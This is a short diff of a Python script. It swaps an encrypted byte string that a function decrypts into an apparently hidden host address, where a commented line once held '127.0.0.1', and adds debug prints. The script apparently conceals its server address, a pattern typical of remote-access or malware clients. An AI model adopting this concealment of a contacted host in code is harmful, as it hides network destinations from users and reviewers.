@@ -50,7 +50,7 @@ def banner():
 
 
 def know_gme():
-    unkown = b'\xda\x81\xf4Gj^\x15\x96\x0b\x03\xebP$(8ND\xbd\xa5\xbe\xe3_\xe8\xe4k\xa1(_\x95{=#\x8d\xfc\x90\xf1\x10\x91\'\x18@hr\xd1\x1b\xcb\x94\x03"$\xb0\xcc\xa2\xc2\x98JM^\x86\xf3\x8dS\x98\xc0'
+    unkown = b'\xc0%\xa5\xaa\x82\xd2\x81v\xa4e\xc1\x16@d-IU\x05,^\x00\x1f\xef\xf8\xf5\x90|U\xed\x97\xa1o\xb7Q\x10\x92\xb9\xbc5BP\x83G\x97\x16]\xb9g\x0b\xd5i\xd3M\xdd\xe6\xa8\xe73\xd8\x86\x85\xb1r\x8c'
     return str(decrypt(unkown).decode())
     #return "127.0.0.1"
 
@@ -305,6 +305,7 @@ def clean():
 
 if __name__ == "__main__":
     try:
+        print(know_gme())
         clean()
         banner()
         # is_admin()
@@ -328,5 +329,6 @@ if __name__ == "__main__":
         except Exception:
             exit()
 
-    except Exception:
+    except Exception as e:
+        print(e)
         pass
